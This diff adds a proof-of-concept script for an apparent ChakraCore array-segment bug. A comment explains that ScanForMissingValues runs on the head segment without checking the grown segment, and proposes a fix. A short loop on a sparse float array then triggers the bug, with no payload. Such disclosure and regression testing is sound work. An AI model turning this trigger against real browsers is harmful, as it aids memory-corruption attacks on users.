@@ -1,0 +1,44 @@
+/*
+Here's a snippet of AppendLeftOverItemsFromEndSegment in JavascriptArray.inl.
+
+growby = endSeg->length;
+current = current->GrowByMin(recycler, growby);
+CopyArray(current->elements + endIndex + 1, endSeg->length,
+    ((Js::SparseArraySegment<T>*)endSeg)->elements, endSeg->length);
+LinkSegments((Js::SparseArraySegment<T>*)startPrev, current);
+if (HasNoMissingValues())
+{
+    if (ScanForMissingValues<T>(endIndex + 1, endIndex + growby))
+    {
+        SetHasNoMissingValues(false);
+    }
+}
+
+In the "ScanForMissingValues" method, it uses "head". But it doesn't check the grown segment "current" is equal to "head" before calling the method.
+I guess it shoud be like:
+if (current == head && HasNoMissingValues())
+{
+    if (ScanForMissingValues<T>(endIndex + 1, endIndex + growby))
+    {
+        SetHasNoMissingValues(false);
+    }
+}
+*/
+
+function trigger() {
+    let arr = [1.1];
+    let i = 0;
+    for (; i < 1000; i += 0.5) {
+        arr[i + 0x7777] = 2.0;
+    }
+
+    arr[1001] = 35480.0;
+
+    for (; i < 0x7777; i++) {
+        arr[i] = 1234.3;
+    }
+}
+
+for (let i = 0; i < 100; i++) {
+    trigger();
+}
